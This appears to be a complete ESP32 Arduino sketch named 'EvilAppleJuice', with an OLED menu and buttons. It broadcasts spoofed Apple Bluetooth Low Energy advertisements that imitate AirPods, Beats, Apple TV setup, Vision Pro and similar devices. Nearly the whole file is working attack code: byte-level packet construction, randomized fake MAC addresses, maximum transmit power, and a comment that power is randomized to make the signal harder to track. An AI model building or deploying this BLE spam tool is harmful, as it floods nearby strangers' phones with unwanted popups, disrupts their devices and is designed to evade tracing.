// This example takes heavy inspiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// See the README for more info

#include <Arduino.h>
#include <cstdint>
#include <cstring>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Preferences.h>
#include <esp_arduino_version.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// ============= OLED SETUP =============
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SDA_PIN 21
#define SCL_PIN 22

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ============= BUTTON PINS =============
#define BUTTON_UP 23
#define BUTTON_DOWN 27
#define BUTTON_SELECT 12

// ============= LED.HPP =============
enum LEDMode { OFF = 0, FLASH = 1, ON = 2 };

LEDMode stateTable[9][2] = {
  {OFF,   OFF},   // 0
  {OFF,   FLASH}, // 1
  {OFF,   ON},    // 2
  {FLASH, OFF},   // 3
  {FLASH, FLASH}, // 4
  {FLASH, ON},    // 5
  {ON,    OFF},   // 6
  {ON,    FLASH}, // 7 
  {ON,    ON}     // 8
};

enum LEDState {
  LEFT_OFF_RIGHT_OFF = 0,
  LEFT_OFF_RIGHT_FLASH = 1,
  LEFT_OFF_RIGHT_ON = 2,
  LEFT_FLASH_RIGHT_OFF = 3,
  LEFT_FLASH_RIGHT_FLASH = 4,
  LEFT_FLASH_RIGHT_ON = 5,
  LEFT_ON_RIGHT_OFF = 6,
  LEFT_ON_RIGHT_FLASH = 7,
  LEFT_ON_RIGHT_ON = 8
};

// Mode names for display
const char* modeNames[] = {
  "AirPods",
  "Random Device",
  "Software Update",
  "AirPods Gen 2",
  "Vision Pro",
  "AirPods Max",
  "AppleTV Setup",
  "Transfer Number",
  "AppleTV Pair"
};

// ============= DEVICES.HPP =============
enum PacketType { APPLE_AUDIO, APPLE_SETUP };

struct AppleDevice {
  const char* name;
  uint8_t modelId;
  PacketType type;
};

enum class DeviceIndex : uint8_t {
  // Audio (31 bytes, ID at index 7)
  AIRPODS = 0,
  POWER_BEATS,
  BEATS_X,
  BEATS_SOLO_3,
  BEATS_STUDIO_3,
  AIRPODS_MAX,
  POWER_BEATS_PRO,
  BEATS_SOLO_PRO,
  AIRPODS_PRO,
  AIRPODS_GEN_2,
  BEATS_FLEX,
  BEATS_STUDIO_BUDS,
  BEATS_FIT_PRO,
  AIRPODS_GEN_3,
  AIRPODS_PRO_GEN_2,
  BEATS_STUDIO_BUDS_PLUS,
  BEATS_STUDIO_PRO,
  AIRPODS_PRO_GEN_2_USB_C,
  BEATS_SOLO_4,
  BEATS_SOLO_BUDS,
  SOFTWARE_UPDATE,
  POWERBEATS_FIT,
  // Setup (23 bytes, ID at index 13)
  APPLETV_SETUP,
  TRANSFER_NUMBER,
  APPLETV_PAIR,
  SETUP_NEW_PHONE,
  HOMEPOD_SETUP,
  APPLETV_HOMEKIT_SETUP,
  APPLETV_KEYBOARD_SETUP,
  TV_COLOR_BALANCE,
  APPLETV_NEW_USER,
  VISION_PRO,
  APPLETV_CONNECTING_TO_NETWORK,
  APPLETV_APPLEID_SETUP,
  APPLETV_WIRELESS_AUDIO_SYNC,
  NUM_DEVICES
};

const AppleDevice ALL_DEVICES[] = {
  // Audio Devices (31 bytes, ID at index 7)
  // These are audio devices: wireless headphones / earbuds
  // It seems these need a shorter range between ESP & iDevice
  {"Airpods", 0x02, APPLE_AUDIO},
  {"Power Beats", 0x03, APPLE_AUDIO},
  {"Beats X", 0x05, APPLE_AUDIO},
  {"Beats Solo 3", 0x06, APPLE_AUDIO},
  {"Beats Studio 3", 0x09, APPLE_AUDIO},
  {"Airpods Max", 0x0a, APPLE_AUDIO},
  {"Power Beats Pro", 0x0b, APPLE_AUDIO},
  {"Beats Solo Pro", 0x0c, APPLE_AUDIO},
  {"Airpods Pro", 0x0e, APPLE_AUDIO},
  {"Airpods Gen 2", 0x0f, APPLE_AUDIO},
  {"Beats Flex", 0x10, APPLE_AUDIO},
  {"Beats Studio Buds", 0x11, APPLE_AUDIO},
  {"Beats Fit Pro", 0x12, APPLE_AUDIO},
  {"Airpods Gen 3", 0x13, APPLE_AUDIO},
  {"Airpods Pro Gen 2", 0x14, APPLE_AUDIO},
  {"Beats Studio Buds Plus", 0x16, APPLE_AUDIO},
  {"Beats Studio Pro", 0x17, APPLE_AUDIO},
  {"Airpods Pro Gen 2 USB-C", 0x24, APPLE_AUDIO},
  {"Beats Solo 4", 0x25, APPLE_AUDIO},
  {"Beats Solo Buds", 0x26, APPLE_AUDIO},
  {"Software update", 0x2e, APPLE_AUDIO},
  {"Powerbeats fit", 0x2f, APPLE_AUDIO},

  // Setup Devices (23 bytes, ID at index 13)
  // These are more general home devices
  // It seems these can work over long distances, especially AppleTV Setup
  {"AppleTV Setup", 0x01, APPLE_SETUP},
  {"Transfer Number", 0x02, APPLE_SETUP},
  {"AppleTV Pair", 0x06, APPLE_SETUP},
  {"Setup New Phone", 0x09, APPLE_SETUP},
  {"Homepod Setup", 0x0b, APPLE_SETUP},
  {"AppleTV Homekit Setup", 0x0d, APPLE_SETUP},
  {"AppleTV Keyboard Setup", 0x13, APPLE_SETUP},
  {"TV Color Balance", 0x1e, APPLE_SETUP},
  {"AppleTV New User", 0x20, APPLE_SETUP},
  {"Vision Pro", 0x24, APPLE_SETUP},
  {"AppleTV Connecting to Network", 0x27, APPLE_SETUP},
  {"AppleTV AppleID Setup", 0x2b, APPLE_SETUP},
  {"AppleTV Wireless Audio Sync", 0xc0, APPLE_SETUP},
};

// ============= DEVICES.CPP (generatePacket function) =============
void generatePacket(const AppleDevice& device, uint8_t* buffer, size_t& outLength) {
  memset(buffer, 0, 31); // Clear buffer

  if (device.type == APPLE_AUDIO) {
      outLength = 31;
      uint8_t header[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
      uint8_t body[]   = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
      
      memcpy(buffer, header, 7);
      buffer[7] = device.modelId;
      memcpy(buffer + 8, body, 11);
  } 
  else if (device.type == APPLE_SETUP) {
      outLength = 23;
      // The common 23-byte setup prefix
      uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
      // The common 23-byte setup suffix (starting after index 13)
      uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
      
      memcpy(buffer, prefix, 13);
      buffer[13] = device.modelId; // In "Short" packets, the ID is at index 13
      memcpy(buffer + 14, suffix, 9);
  }
}

// ============= BLUETOOTH CONFIGURATION =============
// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 100;

int currentMode = 0;
bool isAdvertising = false;
Preferences preferences;

// Button debounce
unsigned long lastButtonTime = 0;
const unsigned long DEBOUNCE_DELAY = 200;

// ============= OLED DISPLAY FUNCTIONS =============
void initDisplay() {
  Wire.begin(SDA_PIN, SCL_PIN);
  
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 allocation failed"));
    for(;;);
  }
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("EvilAppleJuice");
  display.println("Initializing...");
  display.display();
}

void updateDisplay() {
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  
  // Mode number
  display.print("Mode: ");
  display.println(currentMode);
  
  // Mode name
  display.setTextSize(1);
  display.setCursor(0, 25);
  display.println(modeNames[currentMode]);
  
  // Status
  display.setCursor(0, 40);
  if (isAdvertising) {
    display.println("Status: Broadcasting");
  } else {
    display.println("Status: Stopped");
  }
  
  // LED indicators
  display.setCursor(0, 50);
  display.print("LEDs: ");
  if (stateTable[currentMode][0] == ON) display.print("L ");
  else if (stateTable[currentMode][0] == FLASH) display.print("L* ");
  else display.print("   ");
  
  if (stateTable[currentMode][1] == ON) display.print("R");
  else if (stateTable[currentMode][1] == FLASH) display.print("R*");
  
  display.display();
}

// ============= BUTTON HANDLING =============
void handleButtons() {
  unsigned long currentTime = millis();
  
  if (currentTime - lastButtonTime < DEBOUNCE_DELAY) {
    return;
  }
  
  if (digitalRead(BUTTON_UP) == LOW) {
    lastButtonTime = currentTime;
    currentMode = (currentMode + 1) % 9;
    Serial.printf("Mode increased to: %d\n", currentMode);
    preferences.begin("my-app", false);
    preferences.putInt("mode", currentMode);
    preferences.end();
    updateDisplay();
  }
  
  if (digitalRead(BUTTON_DOWN) == LOW) {
    lastButtonTime = currentTime;
    currentMode = (currentMode - 1 + 9) % 9;
    Serial.printf("Mode decreased to: %d\n", currentMode);
    preferences.begin("my-app", false);
    preferences.putInt("mode", currentMode);
    preferences.end();
    updateDisplay();
  }
  
  if (digitalRead(BUTTON_SELECT) == LOW) {
    lastButtonTime = currentTime;
    isAdvertising = !isAdvertising;
    Serial.printf("Advertising toggled: %s\n", isAdvertising ? "ON" : "OFF");
    updateDisplay();
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE with OLED");

  // Setup button pins
  pinMode(BUTTON_UP, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT, INPUT_PULLUP);

  // Initialize display
  initDisplay();
  
  // Open "storage" namespace (false = read/write)
  preferences.begin("my-app", false);
  currentMode = preferences.getInt("mode", 0);
  preferences.end();
  
  Serial.printf("Current Mode: %d\n", currentMode);
  
  BLEDevice::init("AirPods 69");

  // Increase the BLE Power to 21dBm (MAX)
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // Set initial device address
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
  
  updateDisplay();
}

void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
  uint8_t packet[31];
  size_t packetLen;
  generatePacket(dev, packet, packetLen);
  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);

  #ifdef ESP_ARDUINO_VERSION_MAJOR
    #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        oAdvertisementData.addData(String((char*)packet, packetLen));
    #else
        oAdvertisementData.addData(std::string((char*)packet, packetLen));
    #endif
  #endif
}

void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
  // Randomly pick data from one of the devices
  int idx = random(0, sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]));
  AppleDevice dev = ALL_DEVICES[idx];
  setAdvertisementData(oAdvertisementData, dev);
}

bool shouldBeLitOn(LEDMode mode) {
  switch (mode) {
    case ON:    return true;
    case OFF:   return false;
    case FLASH: return true;
    default:    return false;
  }
}

bool shouldBeLitOff(LEDMode mode) {
  switch (mode) {
    case ON:    return false;
    case OFF:   return true;
    case FLASH: return true;
    default:    return false;
  }
}

void loop() {
  // Handle button input
  handleButtons();
  
  // If not advertising, just wait
  if (!isAdvertising) {
    delay(100);
    return;
  }

  // Generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  switch (currentMode){
    case LEFT_OFF_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS]); // This one seems the most spammy
      break;
    case LEFT_OFF_RIGHT_FLASH:
    setRandomDeviceData(oAdvertisementData);
      break;
    case LEFT_OFF_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::SOFTWARE_UPDATE]); // This is fairly spammy, not all phones
      break;
    case LEFT_FLASH_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS_GEN_2]); // TBD
      break;
    case LEFT_FLASH_RIGHT_FLASH:
    setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::VISION_PRO]); // THis one affects very few devices, not as spammy (but kinda fun)
      break;
    case LEFT_FLASH_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::AIRPODS_MAX]); // TBD
      break;
    case LEFT_ON_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::APPLETV_SETUP]); // TBD
      break;
    case LEFT_ON_RIGHT_FLASH:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::TRANSFER_NUMBER]); // TBD
      break;
    case LEFT_ON_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::APPLETV_PAIR]); // TBD
      break;
    default:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[(int)DeviceIndex::HOMEPOD_SETUP]); // TBD
      break;
  }

  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);

  // Start advertising
  pAdvertising->start();

  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();

  // Random signal strength increases the difficulty of tracking the signal
  int rand_val = random(100);  // Generate a random number between 0 and 99
  if (rand_val < 70) {  // 70% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  } else if (rand_val < 85) {  // 15% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  } else if (rand_val < 95) {  // 10% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  } else if (rand_val < 99) {  // 4% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  } else {  // 1% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  }
}